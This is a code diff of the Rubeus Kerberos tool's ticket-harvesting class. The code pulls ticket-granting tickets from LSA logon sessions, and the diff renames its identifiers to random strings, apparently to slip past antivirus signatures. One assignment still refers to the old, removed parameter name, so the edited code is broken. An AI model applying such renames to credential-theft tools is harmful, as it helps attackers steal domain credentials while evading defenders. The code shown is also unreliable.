@@ -11,18 +11,18 @@ namespace Rubeus
         private readonly int monitorIntervalSeconds;
         private readonly int displayIntervalSeconds;
         private readonly string targetUser;
-        private readonly bool renewTickets;
+        private readonly bool cohNge8Qua;
         private readonly string registryBasePath;
         private readonly bool nowrap;
         private readonly int runFor;
         private DateTime lastDisplay;
         private DateTime collectionStart;
 
-        public Harvest(int monitorIntervalSeconds, int displayIntervalSeconds, bool renewTickets, string targetUser, string registryBasePath, bool nowrap, int runFor)
+        public Harvest(int monitorIntervalSeconds, int displayIntervalSeconds, bool cohNge8Qua, string targetUser, string registryBasePath, bool nowrap, int runFor)
         {
             this.monitorIntervalSeconds = monitorIntervalSeconds;
             this.displayIntervalSeconds = displayIntervalSeconds;
-            this.renewTickets = renewTickets;
+            this.cohNge8Qua = renewTickets;
             this.targetUser = targetUser;
             this.registryBasePath = registryBasePath;
             this.lastDisplay = DateTime.Now;
@@ -31,7 +31,7 @@ namespace Rubeus
             this.runFor = runFor;
         }
 
-        public void HarvestTicketGrantingTickets()
+        public void Jaol2jie7w()
         {
             if (!Helpers.IsHighIntegrity())
             {
@@ -43,7 +43,7 @@ namespace Rubeus
             while (true)
             {
                 // extract out the TGTs (service = krbtgt_ w/ full data, silent enumeration
-                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, new LUID(), "krbtgt", this.targetUser, null, true, true);
+                List<LSA.SESSION_CRED> sessionCreds = LSA.ahghiS7ahh(true, new LUID(), "krbtgt", this.targetUser, null, true, true);
                 List<KRB_CRED> currentTickets = new List<KRB_CRED>();
                 foreach(var sessionCred in sessionCreds)
                 {
@@ -53,7 +53,7 @@ namespace Rubeus
                     }
                 }
 
-                if (renewTickets) {
+                if (cohNge8Qua) {
                     // "harvest" mode - so don't display new tickets as they come in
                     AddTicketsToTicketCache(currentTickets, false);
 
@@ -107,10 +107,10 @@ namespace Rubeus
             }
         }
 
-        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool displayNewTickets)
+        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool yu7EishahN)
         {
             // adds a list of KRB_CREDs to the internal cache
-            //  displayNewTickets - display new TGTs as they're added, e.g. "monitor" mode
+            //  yu7EishahN - display new TGTs as they're added, e.g. "monitor" mode
 
             bool newTicketsAdded = false;
 
@@ -147,14 +147,14 @@ namespace Rubeus
                 harvesterTicketCache.Add(ticket);
                 newTicketsAdded = true;
 
-                if (displayNewTickets)
+                if (yu7EishahN)
                 {
                     Console.WriteLine($"\r\n[*] {DateTime.Now.ToUniversalTime()} UTC - Found new TGT:\r\n");
                     LSA.DisplayTicket(ticket, 2, true, true, false, this.nowrap);
                 }
             }
 
-            if(displayNewTickets && newTicketsAdded)
+            if(yu7EishahN && newTicketsAdded)
                 Console.WriteLine("[*] Ticket cache size: {0}\r\n", harvesterTicketCache.Count);
         }
 
